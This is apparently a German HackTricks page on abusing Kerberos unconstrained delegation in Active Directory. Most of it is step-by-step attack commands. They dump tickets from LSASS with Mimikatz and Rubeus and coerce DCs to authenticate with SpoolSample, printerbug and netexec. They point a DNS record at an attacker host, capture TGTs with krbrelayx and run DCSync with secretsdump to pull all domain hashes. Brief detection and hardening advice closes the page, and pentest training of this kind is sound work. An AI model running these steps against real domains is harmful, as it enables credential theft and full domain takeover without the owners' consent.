# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Dies ist eine Funktion, die ein Domain Administrator für jeden **Computer** innerhalb der Domäne aktivieren kann. Wenn sich dann ein **Benutzer an diesem Computer anmeldet**, wird eine **Kopie des TGT** dieses Benutzers im vom DC bereitgestellten **TGS mitgesendet** und **im Speicher von LSASS gespeichert**. Wenn du also Administratorrechte auf dem Computer hast, kannst du die Tickets **dumpen und die Identität der Benutzer auf beliebigen Computern annehmen**.

Wenn sich also ein Domain Administrator an einem Computer mit aktivierter Funktion „Unconstrained Delegation“ anmeldet und du lokale Administratorrechte auf diesem Computer hast, kannst du das Ticket dumpen und überall die Identität des Domain Administrators annehmen (domain privesc).

Du kannst **Computerobjekte mit diesem Attribut finden**, indem du prüfst, ob das Attribut [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) enthält. Das lässt sich mit einem LDAP-Filter ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ erledigen, genau wie es powerview macht:

```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```

Laden Sie das Ticket des Administrators (oder des Opfers) mit **Mimikatz** oder **Rubeus für einen** [**Pass the Ticket**](pass-the-ticket.md)**.** in den Speicher.\
Weitere Informationen: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
[**Weitere Informationen zu Unconstrained Delegation bei ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

Wenn ein Angreifer einen **Computer kompromittieren kann, für den „Unconstrained Delegation“ aktiviert ist**, könnte er einen **Print server** dazu **bringen, sich automatisch** bei diesem Computer anzumelden und dabei ein TGT im Speicher des Servers abzulegen.\
Anschließend könnte der Angreifer einen **Pass the Ticket-Angriff durchführen, um sich als** Computerkonto des Print servers auszugeben.

Um einen Print server dazu zu bringen, sich bei einem beliebigen Computer anzumelden, können Sie [**SpoolSample**](https://github.com/leechristensen/SpoolSample) verwenden:

```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```

Wenn das TGT von einem Domain Controller stammt, könntest du einen [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) durchführen und alle Hashes vom DC erhalten.\
[**Weitere Informationen zu diesem Angriff auf ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

Hier findest du weitere Möglichkeiten, eine **Authentifizierung zu erzwingen:**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Jede andere Coercion-Methode, die das Opfer dazu bringt, sich mit **Kerberos** bei deinem Host mit unconstrained delegation zu authentifizieren, funktioniert ebenfalls. In modernen Umgebungen bedeutet das oft, den klassischen PrinterBug-Ablauf durch **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** oder eine auf **WebClient/WebDAV** basierende Coercion zu ersetzen – je nachdem, welche RPC-Schnittstelle erreichbar ist.

### Missbrauch eines Benutzer-/Servicekontos mit unconstrained delegation

Unconstrained delegation ist **nicht auf Computerobjekte beschränkt**. Auch ein **Benutzer-/Servicekonto** kann als `TRUSTED_FOR_DELEGATION` konfiguriert sein. In diesem Szenario muss das Konto praktisch Kerberos-Service-Tickets für einen **SPN erhalten, dessen Besitzer es ist**.

Daraus ergeben sich zwei sehr häufige offensive Vorgehensweisen:

1. Du kompromittierst das Passwort/den Hash des **Benutzerkontos** mit unconstrained delegation und **fügst dann diesem Konto einen SPN hinzu**.
2. Das Konto hat bereits einen oder mehrere SPNs, aber einer davon verweist auf einen **veralteten/außer Betrieb genommenen Hostnamen**. Es reicht, den fehlenden **DNS-A-Record** neu anzulegen, um den Authentifizierungsablauf zu kapern, ohne die SPN-Zuordnung zu ändern.<sup>[[8]](#references)</sup>

Minimaler Linux-Ablauf:

```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
  secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```

Notes:

- Dies ist besonders nützlich, wenn der unconstrained principal ein **service account** ist und du nur dessen Credentials hast, aber keine Codeausführung auf einem gejointen Host.
- Wenn der Zielbenutzer bereits einen **stale SPN** hat, ist es möglicherweise weniger auffällig, den entsprechenden **DNS record** neu zu erstellen, als einen neuen SPN in AD einzutragen.
- Bei aktuellem Linux-zentriertem Tradecraft kommen `addspn.py`, `dnstool.py`, `krbrelayx.py` und ein Coercion-Primitive zum Einsatz; du musst keinen Windows-Host anfassen, um die Angriffskette abzuschließen.

### Unconstrained Delegation mit einem vom Angreifer erstellten Computer missbrauchen

Moderne Domains haben oft `MachineAccountQuota > 0` (Standardwert 10), sodass jeder authentifizierte Principal bis zu N Computerobjekte erstellen kann. Wenn du außerdem das Token-Privileg `SeEnableDelegationPrivilege` (oder entsprechende Rechte) besitzt, kannst du den neu erstellten Computer so konfigurieren, dass ihm unconstrained delegation anvertraut wird, und eingehende TGTs von privilegierten Systemen sammeln.<sup>[[1]](#references)</sup>

Ablauf auf hoher Ebene:

1) Einen Computer erstellen, den du kontrollierst

```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```

2) Den gefälschten Hostnamen innerhalb der Domäne auflösbar machen

```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
  --action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
  -dns-ip <DC_IP> <DC_FQDN>
```

3) Unconstrained Delegation auf dem vom Angreifer kontrollierten Computer aktivieren

```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```

Warum das funktioniert: Bei unconstrained delegation speichert die LSA auf einem Computer mit aktivierter Delegation eingehende TGTs zwischen. Wenn du einen DC oder privilegierten Server dazu bringst, sich bei deinem gefälschten Host zu authentifizieren, wird dessen Maschinen-TGT gespeichert und kann exportiert werden.

4) krbrelayx im Exportmodus starten und das Kerberos-Material vorbereiten

```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```

5) Authentifizierung vom DC/von den Servern zu deinem gefälschten Host erzwingen

```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```

krbrelayx speichert ccache-Dateien, wenn sich ein Computer authentifiziert, zum Beispiel:

```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```

6) Verwende das abgefangene TGT des DC-Computerkontos, um DCSync durchzuführen

```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Hinweise und Anforderungen:

- `MachineAccountQuota > 0` ermöglicht das Erstellen von Computerkonten ohne besondere Berechtigungen; andernfalls sind explizite Rechte erforderlich.
- Zum Setzen von `TRUSTED_FOR_DELEGATION` auf einem Computer ist `SeEnableDelegationPrivilege` erforderlich (oder die Mitgliedschaft in der Gruppe Domain Admins).
- Stelle sicher, dass dein Fake-Host per DNS-A-Record aufgelöst wird, damit der DC ihn über den FQDN erreichen kann.
- Für Coercion ist ein geeigneter Vektor erforderlich (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN usw.). Deaktiviere diese Vektoren nach Möglichkeit auf DCs.
- Wenn das Victim-Konto als **„Account is sensitive and cannot be delegated“** markiert ist oder Mitglied von **Protected Users** ist, wird das weitergeleitete TGT nicht in das Service-Ticket aufgenommen. Diese Chain liefert daher kein wiederverwendbares TGT.<sup>[[9]](#references)</sup>
- Wenn **Credential Guard** auf dem authentifizierenden Client/Server aktiviert ist, blockiert Windows **Kerberos unconstrained delegation**. Dadurch können ansonsten gültige Coercion-Pfade aus Sicht des Operators fehlschlagen.

Ideen zur Erkennung und Härtung:

- Erstelle Alerts für Event ID 4741 (Computerkonto erstellt) und 4742/4738 (Computer-/Benutzerkonto geändert), wenn UAC `TRUSTED_FOR_DELEGATION` gesetzt wird.
- Überwache ungewöhnliche DNS-A-Record-Einträge in der Domain-Zone.
- Achte auf Spitzen bei 4768/4769 von unerwarteten Hosts sowie auf DC-Authentifizierungen bei Nicht-DC-Hosts.
- Beschränke `SeEnableDelegationPrivilege` auf möglichst wenige Konten, setze `MachineAccountQuota=0`, sofern praktikabel, und deaktiviere den Print Spooler auf DCs. Erzwinge LDAP signing und channel binding.

### Mitigation

- Beschränke DA-/Admin-Anmeldungen auf bestimmte Dienste.
- Setze für privilegierte Konten „Account is sensitive and cannot be delegated“.

## References

- [1] [HTB: Delegate — SYSVOL-Zugangsdaten → Targeted Kerberoast → Unconstrained Delegation → DCSync zu DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Kompromittierung der Domain durch unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME-Fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation in Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Sicherheitsgruppe Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Kompromittierung der Domain über den DC-Printserver und Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
{{#include ../../banners/hacktricks-training.md}}
